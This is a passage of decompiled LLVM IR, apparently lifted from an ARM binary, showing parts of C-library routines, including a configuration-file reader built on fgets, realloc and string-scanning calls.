  br i1 %tmp9, label %.thread, label %dec_label_pc_1576c

.thread:                                          ; preds = %dec_label_pc_15750
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_157a4

dec_label_pc_1576c:                               ; preds = %dec_label_pc_15750
  %v1_1576c = load i32, i32* @r5, align 4
  %v2_1576c = add i32 %v1_1576c, 8
  %v3_1576c = inttoptr i32 %v2_1576c to i32*
  store i32 %v5_1575c, i32* %v3_1576c, align 4
  %v0_15770 = load i32, i32* @r7, align 4
  %v1_15770 = load i32, i32* @r5, align 4
  %v2_15770 = add i32 %v1_15770, 4
  %v3_15770 = inttoptr i32 %v2_15770 to i32*
  store i32 %v0_15770, i32* %v3_15770, align 4
  %v0_15774.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15774

dec_label_pc_15774:                               ; preds = %dec_label_pc_15744, %dec_label_pc_1576c
  %v1_15798 = phi i32 [ %v0_15744, %dec_label_pc_15744 ], [ %v0_15774.pre, %dec_label_pc_1576c ]
  %v1_15774 = add i32 %v1_15798, 4
  %v2_15774 = inttoptr i32 %v1_15774 to i32*
  %v3_15774 = load i32, i32* %v2_15774, align 4
  %v1_15778 = add i32 %v1_15798, 12
  %v2_15778 = inttoptr i32 %v1_15778 to i32*
  %v3_15778 = load i32, i32* %v2_15778, align 4
  %v2_1577c = add i32 %v3_15778, %v3_15774
  store i32 %v2_1577c, i32* @r4, align 4
  %v3_15780 = inttoptr i32 %v2_1577c to i32*
  %v4_15780 = load i32, i32* %v3_15780, align 4
  %v1_15784 = add i32 %v2_1577c, 4
  %v2_15784 = inttoptr i32 %v1_15784 to i32*
  %v3_15784 = load i32, i32* %v2_15784, align 4
  %v1_15788 = add i32 %v2_1577c, 16
  %v2_15788 = inttoptr i32 %v1_15788 to i16*
  %v3_15788 = load i16, i16* %v2_15788, align 2
  %v4_15788 = zext i16 %v3_15788 to i32
  %v1_1578c = add i32 %v2_1577c, 8
  %v2_1578c = inttoptr i32 %v1_1578c to i32*
  %v3_1578c = load i32, i32* %v2_1578c, align 4
  store i32 %v3_1578c, i32* %ip.global-to-local, align 4
  %v2_15790 = add i32 %v4_15788, %v3_15774
  %v2_15794 = or i32 %v3_15784, %v4_15780
  %v4_15794 = icmp eq i32 %v2_15794, 0
  store i32 %v2_15790, i32* %v2_15774, align 4
  %v0_1579c = load i32, i32* %ip.global-to-local, align 4
  %v1_1579c = load i32, i32* @r5, align 4
  %v2_1579c = add i32 %v1_1579c, 16
  %v3_1579c = inttoptr i32 %v2_1579c to i32*
  store i32 %v0_1579c, i32* %v3_1579c, align 4
  br i1 %v4_15794, label %dec_label_pc_15744, label %dec_label_pc_157a4

dec_label_pc_157a4:                               ; preds = %dec_label_pc_15774, %.thread
  %v0_157b0 = load i32, i32* @r6, align 4
  %v2_157b0 = add i32 %v0_157b0, 44
  %v3_157b0 = inttoptr i32 %v2_157b0 to i32*
  %v4_157b0 = load i32, i32* %v3_157b0, align 4
  store i32 %v4_157b0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_157b0)
  %v0_157bc = load i32, i32* @r4, align 4
  ret i32 %v0_157bc

; uselistorder directives
  uselistorder i32 %v2_1577c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_15798, { 1, 0 }
  uselistorder i32 %v6_15744, { 1, 0 }
  uselistorder i32 %v0_15744, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_15774, { 1, 0 }
}

define i32 @function_157d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_157d0:
  %v0_157d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_157d0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_157d0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_157d0, %bb
  %v4_157dc = phi i32 [ %arg1, %dec_label_pc_157d0 ], [ 0, %bb ]
  ret i32 %v4_157dc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_157e0 = load i32, i32* @r4, align 4
  %v6_157e0 = load i32, i32* @r5, align 4
  %v9_157e0 = load i32, i32* @r6, align 4
  %v12_157e0 = load i32, i32* @r7, align 4
  %v15_157e0 = load i32, i32* @r8, align 4
  %v18_157e0 = load i32, i32* @sb, align 4
  %v21_157e0 = load i32, i32* @sl, align 4
  %v24_157e0 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_157e4 = icmp eq i32* %arg1, null
  store i1 %v2_157e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_157e4, label %dec_label_pc_15af4, label %dec_label_pc_157fc

dec_label_pc_157fc:                               ; preds = %entry
  %v1_157fc = urem i32 %arg3, 256
  store i32 %v1_157fc, i32* @sb, align 4
  %v1_15800 = udiv i32 %arg3, 256
  %v3_15804 = urem i32 %v1_15800, 256
  %v3_15808 = mul nuw nsw i32 %v1_157fc, 4
  %v1_15810 = or i32 %v3_15808, 1
  %v1_1581c = and i32 %arg3, 131072
  %v1_15820 = add nsw i32 %v1_157fc, -1
  %v1_1582c = and i32 %arg3, 262144
  store i32 %v1_1582c, i32* %r2.global-to-local, align 4
  %v1_15830 = and i32 %arg3, 65536
  store i32 %v1_15830, i32* %r3.global-to-local, align 4
  store i32 %v1_15830, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_15840 = add i32 %arg4, 1
  store i32 %v1_15840, i32* @sl, align 4
  %v2_159b8 = icmp eq i32 %v1_1581c, 0
  %v1_15a10 = inttoptr i32 %arg2 to i32*
  %v2_15a28 = icmp eq i32 %v1_1582c, 0
  br label %dec_label_pc_15844

dec_label_pc_15844:                               ; preds = %dec_label_pc_15844.backedge, %dec_label_pc_157fc
  %v2_15860 = phi i32 [ %v0_15844.pre, %dec_label_pc_15844.backedge ], [ %tmp, %dec_label_pc_157fc ]
  %v1_15844 = add i32 %v2_15860, 4
  %v2_15844 = inttoptr i32 %v1_15844 to i32*
  %v3_15844 = load i32, i32* %v2_15844, align 4
  store i32 %v3_15844, i32* %r3.global-to-local, align 4
  %v2_15848 = icmp eq i32 %v3_15844, 0
  store i1 %v2_15848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15848, label %dec_label_pc_15850, label %dec_label_pc_15898

dec_label_pc_15850:                               ; preds = %dec_label_pc_15844
  %v1_15850 = add i32 %v2_15860, 16
  %v2_15850 = inttoptr i32 %v1_15850 to i32*
  %v3_15850 = load i32, i32* %v2_15850, align 4
  store i32 %v3_15850, i32* %r3.global-to-local, align 4
  %v2_15854 = icmp eq i32 %v3_15850, 0
  store i1 %v2_15854, i1* %cpsr_z.global-to-local, align 1
  %v1_15858 = add i32 %v2_15860, 8
  %v2_15858 = inttoptr i32 %v1_15858 to i32*
  %v3_15858 = load i32, i32* %v2_15858, align 4
  store i32 %v3_15858, i32* %r3.global-to-local, align 4
  br i1 %v2_15854, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_15850
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_15850, align 4
  %v0_15864.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_15850, %bb
  %v0_15864 = phi i32 [ %v0_15864.pre, %bb ], [ %v3_15858, %dec_label_pc_15850 ]
  %v2_15864 = icmp eq i32 %v0_15864, 0
  store i1 %v2_15864, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15864, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_15810, i32* %r3.global-to-local, align 4
  %v2_1586c = load i32, i32* @r5, align 4
  %v3_1586c = add i32 %v2_1586c, 8
  %v4_1586c = inttoptr i32 %v3_1586c to i32*
  store i32 %v1_15810, i32* %v4_1586c, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_15870 = load i32, i32* @r5, align 4
  %v1_15870 = add i32 %v0_15870, 16
  %v2_15870 = inttoptr i32 %v1_15870 to i32*
  %v3_15870 = load i32, i32* %v2_15870, align 4
  store i32 %v3_15870, i32* %r0.global-to-local, align 4
  %v1_15874 = add i32 %v0_15870, 8
  %v2_15874 = inttoptr i32 %v1_15874 to i32*
  %v3_15874 = load i32, i32* %v2_15874, align 4
  store i32 %v3_15874, i32* %r3.global-to-local, align 4
  %v2_15878 = add i32 %v3_15874, %v3_15870
  store i32 %v2_15878, i32* @r0, align 4
  %v0_1587c = call i32 @malloc()
  store i32 %v0_1587c, i32* %r0.global-to-local, align 4
  %v2_15880 = icmp eq i32 %v0_1587c, 0
  store i1 %v2_15880, i1* %cpsr_z.global-to-local, align 1
  %v1_15884 = load i32, i32* @r5, align 4
  %v2_15884 = add i32 %v1_15884, 4
  %v3_15884 = inttoptr i32 %v2_15884 to i32*
  store i32 %v0_1587c, i32* %v3_15884, align 4
  br i1 %v2_15880, label %dec_label_pc_15af4, label %dec_label_pc_1588c

dec_label_pc_1588c:                               ; preds = %.thread
  %v0_1588c = load i32, i32* @r5, align 4
  %v1_1588c = add i32 %v0_1588c, 20
  %v2_1588c = inttoptr i32 %v1_1588c to i32*
  %v3_1588c = load i32, i32* %v2_1588c, align 4
  %v1_15890 = or i32 %v3_1588c, 1
  store i32 %v1_15890, i32* %r3.global-to-local, align 4
  store i32 %v1_15890, i32* %v2_1588c, align 4
  %v0_15898.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15898

dec_label_pc_15898:                               ; preds = %dec_label_pc_15844, %dec_label_pc_1588c
  %v1_158a0 = phi i32 [ %v2_15860, %dec_label_pc_15844 ], [ %v0_15898.pre, %dec_label_pc_1588c ]
  %v1_15898 = add i32 %v1_158a0, 4
  %v2_15898 = inttoptr i32 %v1_15898 to i32*
  %v3_15898 = load i32, i32* %v2_15898, align 4
  store i32 %v3_15898, i32* %r2.global-to-local, align 4
  %v4_15898 = add i32 %v1_158a0, 8
  %v5_15898 = inttoptr i32 %v4_15898 to i32*
  %v6_15898 = load i32, i32* %v5_15898, align 4
  %v2_1589c = add i32 %v6_15898, %v3_15898
  store i32 %v2_1589c, i32* %r3.global-to-local, align 4
  %v2_158a0 = add i32 %v1_158a0, 12
  %v3_158a0 = inttoptr i32 %v2_158a0 to i32*
  store i32 %v2_1589c, i32* %v3_158a0, align 4
  %v0_158a4 = load i32, i32* @fp, align 4
  store i32 %v0_158a4, i32* @r6, align 4
  br label %dec_label_pc_158a8

dec_label_pc_158a8:                               ; preds = %dec_label_pc_15934, %dec_label_pc_15920, %dec_label_pc_15898
  %v0_158b0 = phi i32 [ %v0_158a4, %dec_label_pc_15898 ], [ %v1_15920, %dec_label_pc_15920 ], [ %v0_158b0.pre.pre, %dec_label_pc_15934 ]
  %v0_158a8 = load i32, i32* @r5, align 4
  %v1_158a8 = add i32 %v0_158a8, 12
  store i32 %v1_158a8, i32* %r0.global-to-local, align 4
  %v1_158ac = inttoptr i32 %v1_158a8 to i32*
  %v2_158ac = load i32, i32* %v1_158ac, align 4
  store i32 %v2_158ac, i32* %r0.global-to-local, align 4
  %v3_158ac = add i32 %v0_158a8, 16
  %v4_158ac = inttoptr i32 %v3_158ac to i32*
  %v5_158ac = load i32, i32* %v4_158ac, align 4
  %v2_158b0 = add i32 %v2_158ac, %v0_158b0
  store i32 %v2_158b0, i32* %r0.global-to-local, align 4
  %v2_158b4 = sub i32 %v5_158ac, %v0_158b0
  %v1_158b8 = inttoptr i32 %v0_158a8 to i32*
  %v2_158b8 = load i32, i32* %v1_158b8, align 4
  store i32 %v2_158b8, i32* %r2.global-to-local, align 4
  %v3_158bc = call i32 @fgets(i32 %v2_158b0, i32 %v2_158b4, i32 %v2_158b8)
  store i32 %v3_158bc, i32* %r0.global-to-local, align 4
  store i32 %v3_158bc, i32* %r4.global-to-local, align 4
  %v2_158c0 = icmp eq i32 %v3_158bc, 0
  store i1 %v2_158c0, i1* %cpsr_z.global-to-local, align 1
  %v0_158c8 = load i32, i32* @r5, align 4
  %v1_158c8 = add i32 %v0_158c8, 12
  br i1 %v2_158c0, label %dec_label_pc_158c8, label %dec_label_pc_158e0

dec_label_pc_158c8:                               ; preds = %dec_label_pc_158a8
  store i32 %v1_158c8, i32* %r0.global-to-local, align 4
  %v1_158cc = inttoptr i32 %v1_158c8 to i32*
  %v2_158cc = load i32, i32* %v1_158cc, align 4
  store i32 %v2_158cc, i32* %r0.global-to-local, align 4
  %v3_158cc = add i32 %v0_158c8, 16
  %v4_158cc = inttoptr i32 %v3_158cc to i32*
  %v5_158cc = load i32, i32* %v4_158cc, align 4
  store i32 %v5_158cc, i32* %r2.global-to-local, align 4
  %v3_158d4 = inttoptr i32 %v2_158cc to i8*
  %v4_158d4 = call i32 @__GI_memset(i8* %v3_158d4, i32 0, i32 %v5_158cc)
  store i32 %v4_158d4, i32* %r0.global-to-local, align 4
  %v0_158d8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15af8

dec_label_pc_158e0:                               ; preds = %dec_label_pc_158a8
  %v2_158e0 = inttoptr i32 %v1_158c8 to i32*
  %v3_158e0 = load i32, i32* %v2_158e0, align 4
  store i32 %v3_158e0, i32* @r4, align 4
  %v1_158e4 = load i32, i32* @r6, align 4
  %v2_158e4 = add i32 %v1_158e4, %v3_158e0
  %v3_158e4 = inttoptr i32 %v2_158e4 to i8*
  store i32 %v2_158e4, i32* %r0.global-to-local, align 4
  %v3_158e8 = call i32 @strlen(i8* %v3_158e4)
  %v0_158f0 = load i32, i32* @r6, align 4
  %v2_158f0 = add i32 %v0_158f0, %v3_158e8
  store i32 %v2_158f0, i32* @r6, align 4
  %v0_158f4 = load i32, i32* @r4, align 4
  store i32 %v0_158f4, i32* @r0, align 4
  %v2_158f8 = call i32 @__GI_strchr(i32 %v0_158f4, i32 10)
  store i32 %v2_158f8, i32* %r0.global-to-local, align 4
  %v2_158fc = icmp eq i32 %v2_158f8, 0
  store i1 %v2_158fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158fc, label %dec_label_pc_15928, label %dec_label_pc_15904

dec_label_pc_15904:                               ; preds = %dec_label_pc_158e0
  %v1_15904 = inttoptr i32 %v2_158f8 to i8*
  %v2_15904 = load i8, i8* %v1_15904, align 1
  %v3_15904 = zext i8 %v2_15904 to i32
  %v1_15908 = add nuw nsw i32 %v3_15904, 255
  %v1_1590c = urem i32 %v1_15908, 256
  store i32 %v1_1590c, i32* %r3.global-to-local, align 4
  %v7_15910 = icmp eq i32 %v1_1590c, 92
  store i1 %v7_15910, i1* %cpsr_z.global-to-local, align 1
  %v1_15914 = trunc i32 %v1_15908 to i8
  store i8 %v1_15914, i8* %v1_15904, align 1
  %v0_15918 = load i32, i32* @r6, align 4
  %v1_15918 = add i32 %v0_15918, -1
  store i32 %v1_15918, i32* @r6, align 4
  %v0_1591c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1591c, label %dec_label_pc_15920, label %dec_label_pc_159ac

dec_label_pc_15920:                               ; preds = %dec_label_pc_15904
  %v1_15920 = add i32 %v0_15918, -2
  store i32 %v1_15920, i32* @r6, align 4
  br label %dec_label_pc_158a8

dec_label_pc_15928:                               ; preds = %dec_label_pc_158e0
  %v0_15928 = load i32, i32* @r5, align 4
  %v1_15928 = add i32 %v0_15928, 20
  %v2_15928 = inttoptr i32 %v1_15928 to i32*
  %v3_15928 = load i32, i32* %v2_15928, align 4
  store i32 %v3_15928, i32* %r3.global-to-local, align 4
  %v2_1592c = icmp eq i32 %v3_15928, 0
  store i1 %v2_1592c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1592c, label %dec_label_pc_15964, label %dec_label_pc_15934

dec_label_pc_15934:                               ; preds = %dec_label_pc_15928
  %v1_15934 = add i32 %v0_15928, 16
  %v2_15934 = inttoptr i32 %v1_15934 to i32*
  %v3_15934 = load i32, i32* %v2_15934, align 4
  store i32 %v3_15934, i32* %r3.global-to-local, align 4
  %v1_15938 = add i32 %v0_15928, 8
  %v2_15938 = inttoptr i32 %v1_15938 to i32*
  %v3_15938 = load i32, i32* %v2_15938, align 4
  %v1_1593c = add i32 %v3_15934, 4096
  store i32 %v1_1593c, i32* %r3.global-to-local, align 4
  %v2_15940 = add i32 %v3_15938, %v1_1593c
  store i32 %v1_1593c, i32* %v2_15934, align 4
  %v0_15948 = load i32, i32* @r5, align 4
  %v1_15948 = add i32 %v0_15948, 4
  %v2_15948 = inttoptr i32 %v1_15948 to i32*
  %v3_15948 = load i32, i32* %v2_15948, align 4
  store i32 %v3_15948, i32* %r0.global-to-local, align 4
  %v4_1594c = inttoptr i32 %v3_15948 to i32*
  %v5_1594c = call i32 @realloc(i32* %v4_1594c, i32 %v2_15940, i32 %v2_158b8, i32 %v1_1593c)
  store i32 %v5_1594c, i32* %r0.global-to-local, align 4
  %v0_15950 = load i32, i32* @r5, align 4
  %v1_15950 = add i32 %v0_15950, 8
  %v2_15950 = inttoptr i32 %v1_15950 to i32*
  %v3_15950 = load i32, i32* %v2_15950, align 4
  %v2_15954 = add i32 %v3_15950, %v5_1594c
  store i32 %v2_15954, i32* %r3.global-to-local, align 4
  %v2_15958 = add i32 %v0_15950, 12
  %v3_15958 = inttoptr i32 %v2_15958 to i32*
  store i32 %v2_15954, i32* %v3_15958, align 4
  %v1_1595c = load i32, i32* @r5, align 4
  %v2_1595c = add i32 %v1_1595c, 4
  %v3_1595c = inttoptr i32 %v2_1595c to i32*
  store i32 %v5_1594c, i32* %v3_1595c, align 4
  %v0_158b0.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_158a8

dec_label_pc_15964:                               ; preds = %dec_label_pc_15928, %.dec_label_pc_15964_crit_edge
  %v0_15964 = phi i32 [ %v0_15964.pre, %.dec_label_pc_15964_crit_edge ], [ %v0_15928, %dec_label_pc_15928 ]
  %v1_15964 = inttoptr i32 %v0_15964 to i32*
  %v2_15964 = load i32, i32* %v1_15964, align 4
  store i32 %v2_15964, i32* @r1, align 4
  %v1_15968 = add i32 %v2_15964, 52
  %v2_15968 = inttoptr i32 %v1_15968 to i32*
  %v3_15968 = load i32, i32* %v2_15968, align 4
  store i32 %v3_15968, i32* %r3.global-to-local, align 4
  %v2_1596c = icmp eq i32 %v3_15968, 0
  store i1 %v2_1596c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1596c, label %dec_label_pc_15998, label %dec_label_pc_15974

dec_label_pc_15974:                               ; preds = %dec_label_pc_15964
  %v1_15974 = add i32 %v2_15964, 16
  %v2_15974 = inttoptr i32 %v1_15974 to i32*
  %v3_15974 = load i32, i32* %v2_15974, align 4
  store i32 %v3_15974, i32* %r2.global-to-local, align 4
  %v1_15978 = add i32 %v2_15964, 24
  %v2_15978 = inttoptr i32 %v1_15978 to i32*
  %v3_15978 = load i32, i32* %v2_15978, align 4
  store i32 %v3_15978, i32* %r3.global-to-local, align 4
  %v3_1597c = icmp ult i32 %v3_15974, %v3_15978
  %v9_1597c = icmp eq i32 %v3_15974, %v3_15978
  store i1 %v9_1597c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1597c, label %dec_label_pc_159a0thread-pre-split, label %dec_label_pc_1598c

dec_label_pc_1598c:                               ; preds = %dec_label_pc_15974
  store i32 %v2_15964, i32* %r0.global-to-local, align 4
  %v1_15990 = inttoptr i32 %v2_15964 to i16*
  %v2_15990 = call i32 @getc_unlocked(i16* %v1_15990)
  store i32 %v2_15990, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_159a0

dec_label_pc_15998:                               ; preds = %dec_label_pc_15964
  store i32 %v2_15964, i32* %r0.global-to-local, align 4
  %v1_1599c = call i32 @__GI_fgetc(i32 %v2_15964)
  store i32 %v1_1599c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_159a0

dec_label_pc_159a0thread-pre-split:               ; preds = %dec_label_pc_15974
  %v2_15980 = inttoptr i32 %v3_15974 to i8*
  %v3_15980 = load i8, i8* %v2_15980, align 1
  %v4_15980 = zext i8 %v3_15980 to i32
  store i32 %v4_15980, i32* %r0.global-to-local, align 4
  %v6_15980 = add i32 %v3_15974, 1
  store i32 %v6_15980, i32* %r2.global-to-local, align 4
  store i32 %v6_15980, i32* %v2_15974, align 4
  %v0_159a0.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_159a0

dec_label_pc_159a0:                               ; preds = %dec_label_pc_159a0thread-pre-split, %dec_label_pc_1598c, %dec_label_pc_15998
  %v1_159a4 = phi i32 [ %v0_159a0.pr, %dec_label_pc_159a0thread-pre-split ], [ %v2_15990, %dec_label_pc_1598c ], [ %v1_1599c, %dec_label_pc_15998 ]
  %v7_159a0 = icmp eq i32 %v1_159a4, 10
  store i1 %v7_159a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_159a0, label %dec_label_pc_159ac.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_159a0
  %v8_159a4 = icmp eq i32 %v1_159a4, -1
  store i1 %v8_159a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_159a4, label %dec_label_pc_159ac.loopexit, label %.dec_label_pc_15964_crit_edge

.dec_label_pc_15964_crit_edge:                    ; preds = %bb66
  %v0_15964.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15964

dec_label_pc_159ac.loopexit:                      ; preds = %bb66, %dec_label_pc_159a0
  %v0_159ac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_159ac

dec_label_pc_159ac:                               ; preds = %dec_label_pc_15904, %dec_label_pc_159ac.loopexit
  %v0_159ac = phi i32 [ %v0_159ac.pre, %dec_label_pc_159ac.loopexit ], [ %v1_15918, %dec_label_pc_15904 ]
  %v7_159ac = icmp eq i32 %v0_159ac, -1
  store i1 %v7_159ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_159ac, label %dec_label_pc_15af4, label %dec_label_pc_159b4

dec_label_pc_159b4:                               ; preds = %dec_label_pc_159ac
  store i32 %v1_1581c, i32* %r3.global-to-local, align 4
  store i1 %v2_159b8, i1* %cpsr_z.global-to-local, align 1
  %v0_159bc = load i32, i32* @r5, align 4
  %v1_159bc = add i32 %v0_159bc, 12
  %v2_159bc = inttoptr i32 %v1_159bc to i32*
  %v3_159bc = load i32, i32* %v2_159bc, align 4
  store i32 %v3_159bc, i32* @r4, align 4
  br i1 %v2_159b8, label %dec_label_pc_159d4, label %dec_label_pc_159c4

dec_label_pc_159c4:                               ; preds = %dec_label_pc_159b4
  store i32 %v3_159bc, i32* @r0, align 4
  %v0_159c8 = load i32, i32* @sl, align 4
  %v2_159cc = inttoptr i32 %v3_159bc to i8*
  %v3_159cc = call i32 @__GI_strspn(i8* %v2_159cc, i32 %v0_159c8)
  store i32 %v3_159cc, i32* %r0.global-to-local, align 4
  %v0_159d0 = load i32, i32* @r4, align 4
  %v2_159d0 = add i32 %v0_159d0, %v3_159cc
  store i32 %v2_159d0, i32* @r4, align 4
  br label %dec_label_pc_159d4

dec_label_pc_159d4:                               ; preds = %dec_label_pc_159b4, %dec_label_pc_159c4
  %v0_159d4 = phi i32 [ %v3_159bc, %dec_label_pc_159b4 ], [ %v2_159d0, %dec_label_pc_159c4 ]
  %v1_159d4 = inttoptr i32 %v0_159d4 to i8*
  %v2_159d4 = load i8, i8* %v1_159d4, align 1
  %v3_159d4 = zext i8 %v2_159d4 to i32
  store i32 %v3_159d4, i32* %r2.global-to-local, align 4
  %v2_159d8 = icmp eq i8 %v2_159d4, 0
  store i1 %v2_159d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159d8, label %dec_label_pc_15844.backedge, label %dec_label_pc_159e0

dec_label_pc_15844.backedge:                      ; preds = %dec_label_pc_159d4, %dec_label_pc_159e0, %dec_label_pc_15aec
  %v0_15844.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15844

dec_label_pc_159e0:                               ; preds = %dec_label_pc_159d4
  %v0_159e0 = load i32, i32* @r7, align 4
  %v1_159e0 = inttoptr i32 %v0_159e0 to i8*
  %v2_159e0 = load i8, i8* %v1_159e0, align 1
  %v3_159e0 = zext i8 %v2_159e0 to i32
  store i32 %v3_159e0, i32* %r3.global-to-local, align 4
  %v9_159e4 = icmp eq i8 %v2_159e0, %v2_159d4
  store i1 %v9_159e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_159e4, label %dec_label_pc_15844.backedge, label %dec_label_pc_159ec

dec_label_pc_159ec:                               ; preds = %dec_label_pc_159e0
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_159f0 = load i32, i32* @r5, align 4
  %v1_159f0 = add i32 %v0_159f0, 4
  %v2_159f0 = inttoptr i32 %v1_159f0 to i32*
  %v3_159f0 = load i32, i32* %v2_159f0, align 4
  store i32 %v3_159f0, i32* %r0.global-to-local, align 4
  %v0_159f4 = load i32, i32* @fp, align 4
  store i32 %v3_159f0, i32* %v1_15a10, align 4
  store i32 %v3_15808, i32* %r2.global-to-local, align 4
  %v3_15a00 = inttoptr i32 %v3_159f0 to i8*
  %v4_15a00 = call i32 @__GI_memset(i8* %v3_15a00, i32 %v0_159f4, i32 %v3_15808)
  store i32 %v4_15a00, i32* %r0.global-to-local, align 4
  %v0_15a04 = load i32, i32* @fp, align 4
  store i32 %v0_15a04, i32* @r6, align 4
  %v0_15ac412 = load i32, i32* @r4, align 4
  %v1_15ac413 = inttoptr i32 %v0_15ac412 to i8*
  %v2_15ac414 = load i8, i8* %v1_15ac413, align 1
  %v3_15ac415 = zext i8 %v2_15ac414 to i32
  store i32 %v3_15ac415, i32* %r2.global-to-local, align 4
  %v2_15ac816 = icmp eq i8 %v2_15ac414, 0
  store i1 %v2_15ac816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ac816, label %dec_label_pc_15ae0, label %dec_label_pc_15ad0

dec_label_pc_15a0c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15a10 = load i32, i32* %v1_15a10, align 4
  store i32 %v2_15a10, i32* %r3.global-to-local, align 4
  store i32 %v1_15820, i32* %r2.global-to-local, align 4
  %v9_15a18 = icmp eq i32 %v2_15a1c, %v1_15820
  store i1 %v9_15a18, i1* %cpsr_z.global-to-local, align 1
  %v5_15a1c = mul i32 %v2_15a1c, 4
  %v6_15a1c = add i32 %v2_15a10, %v5_15a1c
  %v7_15a1c = inttoptr i32 %v6_15a1c to i32*
  store i32 %v0_15a1c, i32* %v7_15a1c, align 4
  br i1 %v9_15a18, label %dec_label_pc_15a24, label %dec_label_pc_15a30

dec_label_pc_15a24:                               ; preds = %dec_label_pc_15a0c
  store i32 %v1_1582c, i32* %r3.global-to-local, align 4
  store i1 %v2_15a28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a28, label %dec_label_pc_15a30, label %dec_label_pc_15a50

dec_label_pc_15a30:                               ; preds = %dec_label_pc_15a24, %dec_label_pc_15a0c
  %v0_15a30 = load i32, i32* @r7, align 4
  %v1_15a30 = inttoptr i32 %v0_15a30 to i8*
  %v2_15a30 = load i8, i8* %v1_15a30, align 1
  %v3_15a30 = zext i8 %v2_15a30 to i32
  store i32 %v3_15a30, i32* %r3.global-to-local, align 4
  %v2_15a34 = icmp eq i8 %v2_15a30, 0
  store i1 %v2_15a34, i1* %cpsr_z.global-to-local, align 1
  %v0_15a38 = load i32, i32* @r4, align 4
  store i32 %v0_15a38, i32* @r0, align 4
  %v1_15a3c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_15a34, i32 %v1_15a3c, i32 %v0_15a30
  store i32 %storemerge, i32* @r1, align 4
  %v0_15a44 = call i32 @strcspn()
  store i32 %v0_15a44, i32* %r0.global-to-local, align 4
  %v0_15a48 = load i32, i32* @r4, align 4
  %v2_15a48 = add i32 %v0_15a48, %v0_15a44
  store i32 %v2_15a48, i32* @r4, align 4
  br label %dec_label_pc_15a88

dec_label_pc_15a50:                               ; preds = %dec_label_pc_15a24
  %v0_15a50 = load i32, i32* @r4, align 4
  store i32 %v0_15a50, i32* @r0, align 4
  %v0_15a54 = load i32, i32* @r7, align 4
  %v1_15a54 = inttoptr i32 %v0_15a54 to i8*
  %v2_15a54 = load i8, i8* %v1_15a54, align 1
  %v3_15a54 = zext i8 %v2_15a54 to i32
  %v5_15a58 = call i32 @__GI_strchrnul(i32 %v0_15a50, i32 %v3_15a54, i32 %v1_15820, i32 %v1_1582c)
  store i32 %v5_15a58, i32* %r0.global-to-local, align 4
  store i32 %v1_1581c, i32* %r2.global-to-local, align 4
  store i1 %v2_159b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_15a58, i32* @r4, align 4
  br i1 %v2_159b8, label %dec_label_pc_15a88, label %dec_label_pc_15a74

dec_label_pc_15a70:                               ; preds = %dec_label_pc_15a74
  %v1_15a70 = add i32 %v0_15a88.pre, -1
  store i32 %v1_15a70, i32* @r4, align 4
  br label %dec_label_pc_15a74

